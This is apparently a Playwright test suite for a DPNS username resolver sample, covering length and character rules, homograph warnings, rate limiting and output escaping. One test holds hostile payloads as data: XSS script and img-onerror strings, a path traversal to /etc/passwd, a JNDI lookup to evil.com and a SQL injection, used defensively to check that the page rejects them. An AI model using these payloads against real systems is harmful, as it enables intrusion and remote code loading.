/**
 * DPNS Validation and Security Tests
 * Tests homograph protection, validation rules, and security features
 */

const { test, expect } = require('@playwright/test');

test.describe('DPNS Resolver - Validation and Security Tests', () => {
  let page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
    await page.goto('http://localhost:8888/samples/dpns-resolver/');
    await page.waitForLoadState('networkidle');
    await page.waitForTimeout(3000);
  });

  test.afterEach(async () => {
    await page.close();
  });

  describe('Username Format Validation', () => {
    test('should validate minimum and maximum length requirements', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Test minimum length (single character)
      await validateInput.fill('a');
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      let validationResults = page.locator('.validation-results');
      if (await validationResults.isVisible()) {
        let resultsText = await validationResults.textContent();
        // Single character should be valid
        expect(resultsText).toMatch(/valid|accepted/i);
      }
      
      // Test maximum length
      const longUsername = 'a'.repeat(64); // Typically max length
      await validateInput.fill(longUsername);
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      if (await validationResults.isVisible()) {
        let resultsText = await validationResults.textContent();
        // Very long usernames might be invalid
        expect(resultsText).toMatch(/valid|invalid|too.*long/i);
      }
      
      // Test extremely long username (definitely invalid)
      const tooLongUsername = 'a'.repeat(100);
      await validateInput.fill(tooLongUsername);
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      if (await validationResults.isVisible()) {
        let resultsText = await validationResults.textContent();
        expect(resultsText).toMatch(/invalid|too.*long|length/i);
      }
    });

    test('should validate allowed characters', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Test allowed characters
      const validChars = [
        'lowercase',
        'with123numbers', 
        'with-hyphens',
        'with_underscores',
        'a1b2c3'
      ];
      
      for (const username of validChars) {
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // These should generally be valid (though specific rules may vary)
          if (resultsText.toLowerCase().includes('invalid')) {
            console.log(`Username "${username}" marked as invalid: ${resultsText}`);
          }
        }
      }
    });

    test('should reject invalid character combinations', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      const invalidUsernames = [
        'UPPERCASE',           // Uppercase letters
        'has spaces',         // Spaces
        'user@domain',        // Email-like format
        'user.com',           // Domain-like format
        'user..double',       // Double dots
        'user--double',       // Double hyphens
        '-startswithhyphen',  // Starts with hyphen
        'endswith-',          // Ends with hyphen
        '_startswithunderscore',
        'endswith_',
        'user!@#$',           // Special characters
        'user/slash',         // Slashes
        'user\\backslash',    // Backslashes
        'user:colon',         // Colons
        'user;semicolon',     // Semicolons
        'user<greaterthan',   // Angle brackets
        'user>lessthan'       // Angle brackets
      ];
      
      for (const username of invalidUsernames) {
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Should be marked as invalid
          expect(resultsText).toMatch(/invalid|not.*valid|error|not.*allowed/i);
          
          // Should provide specific reason
          if (username.includes(' ')) {
            expect(resultsText).toMatch(/space|whitespace/i);
          }
          if (username !== username.toLowerCase()) {
            expect(resultsText).toMatch(/uppercase|case/i);
          }
          if (username.includes('@')) {
            expect(resultsText).toMatch(/special.*character|@/i);
          }
        }
      }
    });

    test('should validate reserved usernames', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Common reserved names that might not be allowed
      const reservedNames = [
        'admin',
        'root',
        'system',
        'dash',
        'platform', 
        'dpns',
        'api',
        'www',
        'ftp',
        'mail',
        'email',
        'support',
        'help',
        'test',
        'demo'
      ];
      
      for (const username of reservedNames.slice(0, 5)) { // Test first 5 to save time
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Check if marked as reserved (implementation specific)
          if (resultsText.toLowerCase().includes('reserved')) {
            expect(resultsText).toMatch(/reserved|not.*available|system/i);
          }
        }
      }
    });

    test('should provide specific validation error messages', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      const testCases = [
        { input: '', expectedError: /empty|required|enter/i },
        { input: 'A', expectedError: /uppercase|case/i },
        { input: 'user space', expectedError: /space|whitespace/i },
        { input: 'user@email', expectedError: /special.*character|@/i },
        { input: 'a'.repeat(100), expectedError: /too.*long|length/i }
      ];
      
      for (const testCase of testCases) {
        await validateInput.fill(testCase.input);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          if (resultsText.toLowerCase().includes('invalid')) {
            expect(resultsText).toMatch(testCase.expectedError);
          }
        }
      }
    });
  });

  describe('Homograph Protection', () => {
    test('should detect potentially confusing character combinations', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Characters that might be confusing (if homograph protection is implemented)
      const potentialHomographs = [
        'o0o0o',     // Mix of letter O and digit 0
        'il1il1',    // Mix of lowercase i, lowercase l, digit 1
        'rn_m',      // r+n can look like m
        'vv_w'       // v+v can look like w
      ];
      
      for (const username of potentialHomographs) {
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Check if homograph protection warnings are shown
          if (resultsText.toLowerCase().includes('confusing') || 
              resultsText.toLowerCase().includes('homograph') ||
              resultsText.toLowerCase().includes('similar')) {
            expect(resultsText).toMatch(/confusing|similar|homograph|warning/i);
          }
        }
      }
    });

    test('should provide safe alternatives for problematic usernames', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Username with potentially confusing characters
      await validateInput.fill('o0o0test');
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      const validationResults = page.locator('.validation-results');
      if (await validationResults.isVisible()) {
        const resultsText = await validationResults.textContent();
        
        // Check if suggestions are provided
        if (resultsText.toLowerCase().includes('suggestion') || 
            resultsText.toLowerCase().includes('alternative') ||
            resultsText.toLowerCase().includes('try')) {
          expect(resultsText).toMatch(/suggest|alternative|try|recommend/i);
        }
      }
    });

    test('should handle Unicode normalization correctly', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Test Unicode normalization cases (if supported)
      const unicodeTestCases = [
        'café',        // Accented characters
        'naïve',       // Diaeresis
        'résumé',      // Multiple accents
        'münchen'      // Umlaut
      ];
      
      for (const username of unicodeTestCases) {
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Check how Unicode characters are handled
          expect(resultsText).toMatch(/valid|invalid|unicode|character/i);
        }
      }
    });
  });

  describe('Security and Contest Detection', () => {
    test('should detect potential username contests', async () => {
      // This would test if the system can detect when multiple parties
      // might want the same username (contest scenarios)
      
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // High-value usernames that might be contested
      const contestableNames = [
        'bitcoin',
        'ethereum', 
        'dash',
        'crypto',
        'money'
      ];
      
      for (const username of contestableNames.slice(0, 2)) { // Test subset
        await validateInput.fill(username);
        await validateBtn.click();
        await page.waitForTimeout(3000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Check if contest warnings are shown (implementation specific)
          if (resultsText.toLowerCase().includes('contest') ||
              resultsText.toLowerCase().includes('auction') ||
              resultsText.toLowerCase().includes('competitive')) {
            expect(resultsText).toMatch(/contest|auction|competitive|bid/i);
          }
        }
      }
    });

    test('should handle malicious input attempts', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Potential malicious inputs
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '%27%20OR%20%271%27=%271',
        'admin\'; DROP TABLE users;--',
        '\x00\x01\x02\x03'  // Null bytes and control chars
      ];
      
      for (const maliciousInput of maliciousInputs) {
        await validateInput.fill(maliciousInput);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        // Should handle malicious input gracefully without breaking
        const validationResults = page.locator('.validation-results');
        const isPageWorking = await page.locator('.app-container').isVisible();
        
        // Page should still work
        expect(isPageWorking).toBe(true);
        
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Should mark as invalid
          expect(resultsText).toMatch(/invalid|not.*valid|error/i);
          
          // Should not execute or reflect the malicious code
          expect(resultsText).not.toContain('<script>');
          expect(resultsText).not.toContain('javascript:');
        }
      }
    });

    test('should rate limit validation requests', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Rapid fire validation requests
      const rapidRequests = 10;
      const startTime = Date.now();
      
      for (let i = 0; i < rapidRequests; i++) {
        await validateInput.fill(`test${i}`);
        await validateBtn.click();
        await page.waitForTimeout(100); // Very short delay
      }
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      
      console.log(`${rapidRequests} rapid validation requests took ${totalTime}ms`);
      
      // Check if rate limiting is applied (requests should take reasonable time)
      // or if error messages about rate limiting appear
      const errorMessage = page.locator('.error-message, .rate-limit');
      if (await errorMessage.isVisible()) {
        const errorText = await errorMessage.textContent();
        expect(errorText).toMatch(/rate.*limit|too.*many|slow.*down/i);
      }
      
      // Should still be responsive after rapid requests
      await page.waitForTimeout(2000);
      const isWorking = await validateBtn.isVisible();
      expect(isWorking).toBe(true);
    });
  });

  describe('Input Sanitization and Encoding', () => {
    test('should properly encode special characters in output', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Test various encoding scenarios
      const encodingTests = [
        '&amp;test',
        '<>quotes',
        '"double"quotes',
        "'single'quotes",
        'emoji😀test'
      ];
      
      for (const input of encodingTests) {
        await validateInput.fill(input);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        const validationResults = page.locator('.validation-results');
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          
          // Output should be properly encoded/escaped
          expect(resultsText).toBeDefined();
          
          // Check that dangerous characters are handled
          const innerHTML = await validationResults.innerHTML();
          expect(innerHTML).not.toContain('<script');
          expect(innerHTML).not.toContain('javascript:');
        }
      }
    });

    test('should handle various input encodings', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Different encoding formats
      const encodingInputs = [
        'test%20space',      // URL encoded space
        'test&#32;space',    // HTML entity
        'test\u0020space',   // Unicode escape
        'test\t\n\r',       // Control characters
        'test\x00null'       // Null character
      ];
      
      for (const input of encodingInputs) {
        await validateInput.fill(input);
        await validateBtn.click();
        await page.waitForTimeout(2000);
        
        // Should handle without breaking
        const validationResults = page.locator('.validation-results');
        const isPageWorking = await page.locator('.app-container').isVisible();
        
        expect(isPageWorking).toBe(true);
        
        if (await validationResults.isVisible()) {
          const resultsText = await validationResults.textContent();
          expect(resultsText).toMatch(/valid|invalid|error/i);
        }
      }
    });

    test('should prevent code injection through validation responses', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Attempt code injection through input that might be reflected
      await validateInput.fill('<img src=x onerror=alert(1)>');
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      // Check that no alert was executed
      const alertsCount = await page.evaluate(() => {
        return typeof window.__alertCount !== 'undefined' ? window.__alertCount : 0;
      });
      
      expect(alertsCount).toBe(0);
      
      // Check that validation results don't contain executable code
      const validationResults = page.locator('.validation-results');
      if (await validationResults.isVisible()) {
        const innerHTML = await validationResults.innerHTML();
        expect(innerHTML).not.toContain('onerror=');
        expect(innerHTML).not.toContain('<img src=');
      }
    });
  });

  describe('Error Handling and Recovery', () => {
    test('should handle network timeouts during validation', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // This test would ideally mock network delays/failures
      // For now, test with potentially slow validation
      await validateInput.fill('potentially-slow-validation-username');
      await validateBtn.click();
      
      // Wait for extended period
      await page.waitForTimeout(15000);
      
      // Should either complete or show timeout error
      const validationResults = page.locator('.validation-results');
      const errorMessage = page.locator('.error-message');
      
      const hasResults = await validationResults.isVisible();
      const hasError = await errorMessage.isVisible();
      
      expect(hasResults || hasError).toBe(true);
      
      if (hasError) {
        const errorText = await errorMessage.textContent();
        expect(errorText).toMatch(/timeout|network|error|failed/i);
      }
    });

    test('should recover from validation errors', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Cause an error
      await validateInput.fill('potentially-problematic-input-12345');
      await validateBtn.click();
      await page.waitForTimeout(5000);
      
      // Try with normal input after error
      await validateInput.fill('normaluser');
      await validateBtn.click();
      await page.waitForTimeout(3000);
      
      // Should work normally after error
      const validationResults = page.locator('.validation-results');
      if (await validationResults.isVisible()) {
        const resultsText = await validationResults.textContent();
        expect(resultsText).toMatch(/valid/i);
      }
    });

    test('should maintain state consistency during errors', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Fill input with problematic data
      await validateInput.fill('error-causing-input');
      await validateBtn.click();
      await page.waitForTimeout(5000);
      
      // Check that input field still works
      await validateInput.fill('');
      await validateInput.fill('recovery-test');
      
      const inputValue = await validateInput.inputValue();
      expect(inputValue).toBe('recovery-test');
      
      // Button should still be clickable
      await expect(validateBtn).toBeEnabled();
    });

    test('should handle validation of extremely long inputs', async () => {
      const validateInput = page.locator('#validateUsernameInput');
      const validateBtn = page.locator('#validateBtn');
      
      // Create extremely long input
      const veryLongInput = 'a'.repeat(1000);
      
      await validateInput.fill(veryLongInput);
      await validateBtn.click();
      await page.waitForTimeout(5000);
      
      // Should handle gracefully without breaking
      const isPageWorking = await page.locator('.app-container').isVisible();
      expect(isPageWorking).toBe(true);
      
      const validationResults = page.locator('.validation-results');
      if (await validationResults.isVisible()) {
        const resultsText = await validationResults.textContent();
        expect(resultsText).toMatch(/invalid|too.*long|length/i);
      }
    });
  });
});